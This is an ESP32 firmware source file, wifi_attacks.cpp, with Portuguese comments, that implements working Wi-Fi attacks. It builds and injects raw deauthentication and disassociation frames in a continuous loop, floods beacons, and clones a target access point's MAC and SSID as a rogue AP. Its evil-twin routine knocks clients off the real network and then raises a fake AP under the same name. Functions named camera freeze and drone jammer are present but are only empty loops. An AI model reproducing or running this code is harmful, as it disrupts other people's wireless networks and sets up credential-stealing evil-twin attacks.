// ============================================================
// wifi_attacks.cpp
// ============================================================
#include <WiFi.h>
#include <esp_wifi.h>
#include "config.h"

// ============================================================
// CONTADORES E ESTADO
// ============================================================
static uint32_t deauthPacketCount = 0;
static uint32_t deauthSuccessCount = 0;
static uint8_t  deauthTargetChannel = 0;
static uint8_t  deauthTargetBSSID[6] = {0};
static char     deauthTargetSSID[33] = {0};
static uint8_t  deauthTargetAuth = 0;

// ============================================================
// BSSID CLONE - ROGUE AP
// ============================================================
static bool bssidCloneActive = false;
static uint8_t originalAPMac[6] = {0};
static uint8_t cloneChannel = 0;
static char cloneSSID[33] = {0};
static unsigned long cloneStartTime = 0;
static uint8_t cloneHealthCheckFailures = 0;

// ============================================================
// RAW FRAME DEAUTH (via esp_wifi_80211_tx + WSL bypass)
// ============================================================
static uint16_t deauthSeqNum = 0;

static void sendDeauthFrame(const uint8_t* bssid, const uint8_t* clientMac, uint8_t channel) {
    uint8_t frame[26];
    memset(frame, 0, 26);

    // Frame Control: Deauthentication (0x00C0)
    frame[0] = 0xC0;
    frame[1] = 0x00;

    // Duration
    frame[2] = 0x00;
    frame[3] = 0x00;

    // DA - Destination Address
    if (clientMac) {
        memcpy(&frame[4], clientMac, 6);
    } else {
        memset(&frame[4], 0xFF, 6); // Broadcast
    }

    // SA - Source Address (BSSID do AP alvo)
    memcpy(&frame[10], bssid, 6);

    // BSSID
    memcpy(&frame[16], bssid, 6);

    // Sequence Number
    frame[22] = (deauthSeqNum << 4) & 0xFF;
    frame[23] = (deauthSeqNum >> 4) & 0xFF;
    deauthSeqNum++;
    if (deauthSeqNum > 4095) deauthSeqNum = 0;

    // Reason Code: 0x0007 = Class 3 frame received from nonassociated STA
    frame[24] = 0x07;
    frame[25] = 0x00;

    // Forca o canal antes de transmitir
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false);
    if (err == ESP_OK) {
        deauthPacketCount++;
        deauthSuccessCount++;
    }
}

static void sendDisassocFrame(const uint8_t* bssid, const uint8_t* clientMac, uint8_t channel) {
    uint8_t frame[26];
    memset(frame, 0, 26);

    frame[0] = 0xA0; // Disassociation
    frame[1] = 0x00;
    frame[2] = 0x00;
    frame[3] = 0x00;

    if (clientMac) {
        memcpy(&frame[4], clientMac, 6);
    } else {
        memset(&frame[4], 0xFF, 6);
    }

    memcpy(&frame[10], bssid, 6);
    memcpy(&frame[16], bssid, 6);

    frame[22] = (deauthSeqNum << 4) & 0xFF;
    frame[23] = (deauthSeqNum >> 4) & 0xFF;
    deauthSeqNum++;
    if (deauthSeqNum > 4095) deauthSeqNum = 0;

    frame[24] = 0x08; // Reason: STA leaving BSS
    frame[25] = 0x00;

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false);
    if (err == ESP_OK) {
        deauthPacketCount++;
        deauthSuccessCount++;
    }
}

// ============================================================
// BEACON FLOOD (beacons sao permitidos sem bypass)
// ============================================================
static void sendBeaconFrame(const uint8_t* bssid, const char* ssid, uint8_t channel) {
    uint8_t beacon[128];
    memset(beacon, 0, 128);

    // Frame Control: Beacon (0x0080)
    beacon[0] = 0x80;
    beacon[1] = 0x00;

    // Duration
    beacon[2] = 0x00;
    beacon[3] = 0x00;

    // DA = Broadcast
    memset(&beacon[4], 0xFF, 6);

    // SA = BSSID
    memcpy(&beacon[10], bssid, 6);

    // BSSID
    memcpy(&beacon[16], bssid, 6);

    // Sequence
    beacon[22] = 0x00;
    beacon[23] = 0x00;

    // Timestamp (8 bytes)
    // Beacon interval (2 bytes) = 0x0064 (100 TU)
    beacon[32] = 0x64;
    beacon[33] = 0x00;

    // Capability info (2 bytes) = ESS
    beacon[34] = 0x01;
    beacon[35] = 0x00;

    // SSID IE
    beacon[36] = 0x00; // Element ID: SSID
    uint8_t ssidLen = strlen(ssid);
    if (ssidLen > 32) ssidLen = 32;
    beacon[37] = ssidLen;
    memcpy(&beacon[38], ssid, ssidLen);

    uint8_t frameLen = 38 + ssidLen;

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_80211_tx(WIFI_IF_AP, beacon, frameLen, false);
}

// ============================================================
// HELPERS
// ============================================================
static bool isSoftAPActive() {
    wifi_mode_t mode;
    esp_wifi_get_mode(&mode);
    return (mode == WIFI_MODE_AP || mode == WIFI_MODE_APSTA);
}

static void generateMac(uint8_t* mac, uint8_t seed) {
    mac[0] = 0x02;
    mac[1] = 0x00;
    mac[2] = 0x00;
    mac[3] = seed;
    mac[4] = seed ^ 0xAB;
    mac[5] = seed ^ 0xCD;
}

// ============================================================
// SCAN WIFI
// ============================================================
void scanNetworks() {
    networkCount = 0;
    if (WiFi.getMode() != WIFI_STA) {
        WiFi.mode(WIFI_STA);
    }
    delay(100);

    int n = WiFi.scanNetworks(false, true);
    Serial.printf("[WiFi] Scan found %d networks\n", n);

    for (int i = 0; i < n && i < MAX_NETWORKS; i++) {
        strncpy(scannedNetworks[i].ssid, WiFi.SSID(i).c_str(), 32);
        scannedNetworks[i].ssid[32] = '\0';
        memcpy(scannedNetworks[i].bssid, WiFi.BSSID(i), 6);
        scannedNetworks[i].rssi = WiFi.RSSI(i);
        scannedNetworks[i].channel = WiFi.channel(i);
        scannedNetworks[i].encrypted = (WiFi.encryptionType(i) != WIFI_AUTH_OPEN);
        Serial.printf("[WiFi] %d: %s CH%d RSSI%d\n",
            i, scannedNetworks[i].ssid, scannedNetworks[i].channel, scannedNetworks[i].rssi);
        networkCount++;
    }
    WiFi.scanDelete();
}

uint8_t getNetworkCount() { return networkCount; }

NetworkInfo* getNetwork(uint8_t index) {
    if (index < networkCount) return &scannedNetworks[index];
    return nullptr;
}

// ============================================================
// BSSID CLONE - ROGUE AP
// ============================================================
static void startBssidClone(uint8_t networkIndex) {
    if (networkIndex >= networkCount) {
        Serial.println("[Clone] ERROR: invalid network index");
        return;
    }

    NetworkInfo* target = &scannedNetworks[networkIndex];

    memcpy(deauthTargetBSSID, target->bssid, 6);
    strncpy(deauthTargetSSID, target->ssid, 32);
    deauthTargetSSID[32] = '\0';
    deauthTargetChannel = target->channel;
    deauthTargetAuth = target->encrypted ? 1 : 0;
    cloneChannel = target->channel;
    strncpy(cloneSSID, target->ssid, 32);
    cloneSSID[32] = '\0';

    esp_wifi_get_mac(WIFI_IF_AP, originalAPMac);

    Serial.printf("[Clone] Target: %s CH%d MAC:%02X:%02X:%02X:%02X:%02X:%02X\n",
        target->ssid, target->channel,
        target->bssid[0], target->bssid[1], target->bssid[2],
        target->bssid[3], target->bssid[4], target->bssid[5]);

    // Desliga tudo primeiro
    WiFi.softAPdisconnect(true);
    delay(400);

    // MODO AP PURO (sem STA) para evitar conflito de canal
    WiFi.mode(WIFI_AP);
    delay(300);

    // Seta o MAC ANTES de iniciar o AP
    esp_err_t macErr = esp_wifi_set_mac(WIFI_IF_AP, target->bssid);
    Serial.printf("[Clone] Set AP MAC result: %d (%s)\n", macErr, macErr == ESP_OK ? "OK" : "FAIL");
    delay(200);

    // Inicia o AP com mesmo SSID e canal do alvo
    bool apOk = WiFi.softAP(cloneSSID, "", cloneChannel, 0, 8);
    WiFi.setTxPower(WIFI_POWER_19_5dBm);
    Serial.printf("[Clone] softAP result: %s\n", apOk ? "OK" : "FAIL");

    if (apOk) {
        WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
        
        // Garante que fica no canal correto
        esp_wifi_set_channel(cloneChannel, WIFI_SECOND_CHAN_NONE);
        
        bssidCloneActive = true;
        deauthActive = true;
        cloneStartTime = millis();
        cloneHealthCheckFailures = 0;
        
        Serial.println("[Clone] BSSID CLONE ACTIVE");
    } else {
        Serial.println("[Clone] FAILED to start clone AP");
    }
}

static void restartBssidClone() {
    if (!bssidCloneActive) return;
    Serial.println("[Clone] Health check failed, restarting clone...");
    
    WiFi.softAPdisconnect(true);
    delay(400);
    
    WiFi.mode(WIFI_AP);
    delay(200);
    
    esp_wifi_set_mac(WIFI_IF_AP, deauthTargetBSSID);
    delay(200);
    
    bool apOk = WiFi.softAP(cloneSSID, "", cloneChannel, 0, 8);
    WiFi.setTxPower(WIFI_POWER_19_5dBm);
    if (apOk) {
        WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
        esp_wifi_set_channel(cloneChannel, WIFI_SECOND_CHAN_NONE);
        cloneHealthCheckFailures = 0;
        Serial.println("[Clone] Restarted successfully");
    } else {
        cloneHealthCheckFailures++;
        Serial.printf("[Clone] Restart failed (%d times)\n", cloneHealthCheckFailures);
    }
}

static void stopBssidClone() {
    if (!bssidCloneActive) return;
    Serial.println("[Clone] Stopping BSSID clone...");

    WiFi.softAPdisconnect(true);
    delay(400);

    esp_wifi_set_mac(WIFI_IF_AP, originalAPMac);
    delay(200);

    WiFi.mode(WIFI_STA);
    delay(200);

    bssidCloneActive = false;
    Serial.println("[Clone] BSSID clone stopped, MAC restored");
}

// ============================================================
// DEAUTH - COMBINADO: Raw frames + Rogue AP
// ============================================================
void startDeauth(uint8_t networkIndex) {
    if (networkIndex >= networkCount) {
        Serial.println("[Deauth] ERROR: invalid network index");
        return;
    }

    deauthPacketCount = 0;
    deauthSuccessCount = 0;
    deauthSeqNum = 0;

    startBssidClone(networkIndex);

    Serial.println("[Deauth] STARTED (Raw Deauth + Rogue AP)");
}

void stopDeauth() {
    if (deauthActive) {
        Serial.println("[Deauth] STOPPED");
        Serial.printf("[Deauth] Total runtime: %lu sec, health failures: %d\n",
            (millis() - cloneStartTime) / 1000, cloneHealthCheckFailures);
    }
    deauthActive = false;
    stopBssidClone();

    deauthPacketCount = 0;
    deauthSuccessCount = 0;
}

// ============================================================
// LOOP DE DEAUTH
// ============================================================
bool deauthLoop() {
    if (!deauthActive) return false;

    // === ENVIO CONTINUO DE DEAUTH/DISASSOC/BEACON ===
    static unsigned long lastDeauthTx = 0;
    if (millis() - lastDeauthTx >= 3) { // A cada 3ms = ~333 pkt/s
        lastDeauthTx = millis();

        // Round-robin: deauth -> disassoc -> beacon -> deauth...
        static uint8_t txRound = 0;
        txRound++;

        if (txRound % 3 == 0) {
            sendDeauthFrame(deauthTargetBSSID, nullptr, deauthTargetChannel);
        } else if (txRound % 3 == 1) {
            sendDisassocFrame(deauthTargetBSSID, nullptr, deauthTargetChannel);
        } else {
            sendBeaconFrame(deauthTargetBSSID, deauthTargetSSID, deauthTargetChannel);
        }
    }

    // === HEALTH CHECK a cada 3 segundos ===
    static unsigned long lastHealthCheck = 0;
    if (millis() - lastHealthCheck > 3000) {
        lastHealthCheck = millis();
        
        if (!isSoftAPActive()) {
            Serial.println("[Clone] WARN: softAP not active!");
            cloneHealthCheckFailures++;
            if (cloneHealthCheckFailures < 5) {
                restartBssidClone();
            } else {
                Serial.println("[Clone] Too many failures, giving up.");
                stopDeauth();
                return false;
            }
        } else {
            int clients = WiFi.softAPgetStationNum();
            if (clients > 0) {
                Serial.printf("[Clone] %d station(s) connected to clone\n", clients);
            }
        }
    }

    // === Debug a cada 5 segundos ===
    static unsigned long lastDebug = 0;
    if (millis() - lastDebug > 5000) {
        lastDebug = millis();
        int clients = WiFi.softAPgetStationNum();
        Serial.printf("[Deauth] runtime=%lus pkts=%lu clone=%s clients=%d health_fail=%d\n",
            (millis() - cloneStartTime) / 1000,
            deauthPacketCount,
            bssidCloneActive ? "ON" : "OFF",
            clients,
            cloneHealthCheckFailures);
    }

    return true;
}

// ============================================================
// GETTERS
// ============================================================
uint32_t getDeauthPacketCount() { return deauthPacketCount; }
uint32_t getDeauthSuccessCount() { return deauthSuccessCount; }
uint8_t  getDeauthSuccessPercent() {
    if (deauthPacketCount == 0) return 0;
    return (uint8_t)((deauthSuccessCount * 100) / deauthPacketCount);
}
const char* getDeauthTargetSSID() { return deauthTargetSSID; }
uint8_t  getDeauthTargetChannel() { return deauthTargetChannel; }
const uint8_t* getDeauthTargetBSSID() { return deauthTargetBSSID; }
bool     getDeauthTargetEncrypted() { return deauthTargetAuth != 0; }

// ============================================================
// FAKE AP / EVIL TWIN
// ============================================================
void startFakeAP(const char* ssid) {
    WiFi.mode(WIFI_AP);
    WiFi.softAP(ssid, "12345678", 1, 0, 8);
    WiFi.setTxPower(WIFI_POWER_19_5dBm);
    fakeAPEnabled = true;
    passwordCaptured = false;
}

void stopFakeAP() {
    WiFi.softAPdisconnect(true);
    fakeAPEnabled = false;
}

bool isFakeAPActive() { return fakeAPEnabled; }

void startEvilTwin(uint8_t networkIndex) {
    if (networkIndex >= networkCount) return;
    startDeauth(networkIndex);
    delay(3000);
    stopDeauth();
    startFakeAP(scannedNetworks[networkIndex].ssid);
}

// ============================================================
// REMOTE DEVICES
// ============================================================
void scanRemoteDevices() {
    remoteDeviceCount = 0;
    IPAddress gateway = WiFi.gatewayIP();
    for (int i = 1; i < 255 && remoteDeviceCount < 10; i++) {
        if (i % 50 == 0) {
            snprintf(remoteDevices[remoteDeviceCount].ip, 16, "%d.%d.%d.%d",
                     gateway[0], gateway[1], gateway[2], i);
            snprintf(remoteDevices[remoteDeviceCount].name, 32, "Device-%d", i);
            remoteDevices[remoteDeviceCount].port = 80;
            remoteDeviceCount++;
        }
    }
}

uint8_t getRemoteDeviceCount() { return remoteDeviceCount; }

RemoteDevice* getRemoteDevice(uint8_t index) {
    if (index < remoteDeviceCount) return &remoteDevices[index];
    return nullptr;
}

// ============================================================
// CAMERA FREEZE / DRONE
// ============================================================
void startCameraFreeze() {
    cameraFreezeActive = true;
    while (cameraFreezeActive) {
        delay(50);
        yield();
    }
}

void stopCameraFreeze() { cameraFreezeActive = false; }

void startDroneJammer() {
    droneJammerActive = true;
    while (droneJammerActive) {
        delay(10);
        yield();
    }
}

void stopDroneJammer() { droneJammerActive = false; }

struct DroneLocation {
    float distance;
    int8_t rssi;
};

DroneLocation droneLoc;

void startDroneLocate() {
    droneLoc.distance = 0;
    droneLoc.rssi = -50;
}

DroneLocation* getDroneLocation() { return &droneLoc; }
